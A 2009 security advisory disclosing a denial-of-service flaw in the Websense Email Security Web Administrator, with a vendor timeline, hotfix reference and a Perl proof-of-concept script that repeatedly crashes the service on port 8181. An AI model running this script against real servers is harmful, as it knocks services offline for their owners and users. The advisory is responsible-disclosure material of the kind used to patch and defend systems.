_________________________________________
Security Advisory NSOADV-2009-002
_________________________________________
_________________________________________


  Title:                  Websense Email Security Web Administrator DoS
  Severity:               Low
  Advisory ID:            NSOADV-2009-002
  Found Date:             28.09.2009
  Date Reported:          01.10.2009
  Release Date:           20.10.2009
  Author:                 Nikolas Sotiriu
  Mail:                   nso-research (at) sotiriu.de
  URL:                    http://sotiriu.de/adv/NSOADV-2009-002.txt
  Vendor:                 Websense (http://www.websense.com/)
  Affected Products:      Websense Email Security v7.1
                          Personal Email Manager v7.1
  Not Affected Products:  Websense Email Security v7.1 Hotfix 4
                          Personal Email Manager v7.1 Hotfix 4
  Remote Exploitable:     Yes
  Local Exploitable:      Yes
  Patch Status:           Patched with Hotfix 4
  Disclosure Policy:      http://sotiriu.de/policy.html
  Thanks to:              Thierry Zoller: for the permission to use his
                                          Policy



Background:
===========

Websense Email Security software incorporates multiple layers of
real-time Web security and data security intelligence to provide
leading email protection from converged email and Web 2.0 threats.
It helps to manage outbound data leaks and compliance risk, and enables
a consolidated security strategy with the trusted leader in Essential
Information Protection.

(Product description from Websense Website)

The Websense Email Security Web Administrator is a webfrontend, which
enables you to access the message administration, directory management
and to view the log.



Description:
============

The Web Administrator frontend (STEMWADM.EXE) listens by default on port
TCP/8181.

If an attacker sends a HTTP Request to port 8181 without waiting for a
response the webserver crashes. The proof of concept script just sends
a "GET /index.asp" and closes the socket. The server can not response
to the request anymore and dies.

By default the service will always restart after a crash. So the poc
will send the request until it will be stopped.



Proof of Concept :
==================

#!/usr/bin/perl
use Socket;

(($target = $ARGV[0]) && ($port = $ARGV[1])) || die "Usage: $0 ",
"<target> <port> \n";

print "\nThe Webserver on http://$target:$port should be dead until",
"this script is running\n";

while (1) {
$ip = inet_aton($target) || die "host($target) not found.\n";
$sockaddr = pack_sockaddr_in($port, $ip);
socket(SOCKET, PF_INET, SOCK_STREAM, 0) || die "socket error.\n";

connect(SOCKET, $sockaddr) || die "connect $target $port error.\n";

print SOCKET "GET /index.asp";
print "Request sent ...\n";

close(SOCKET);

sleep 1;

};





Solution:
=========

Vendor released a patch.

http://tinyurl.com/yhe3hqa



Disclosure Timeline (YYYY/MM/DD):
=================================

2009.09.28: Vulnerability found
2009.10.01: Ask for a PGP Key
2009.10.01: Websense sent there PGP Key
2009.10.01: Sent PoC, Advisory, Disclosure policy and planned disclosure
            date to Vendor
2009.10.08: Websense was not able to reproduce the DoS Problem
2009.10.08: Sent a mail with more explanation
2009.10.13: Websense verifies the finding and fixed it. The path will be
            available in Version 7.2 which will be released in ~2 weeks
2009.10.13: Ask for a list of affected versions/products and changed the
            release date to 2009.10.29.
            (no response)
2009.10.20: Found the KB article and the Hotfix on Websense website
2009.10.20: Release of this advisory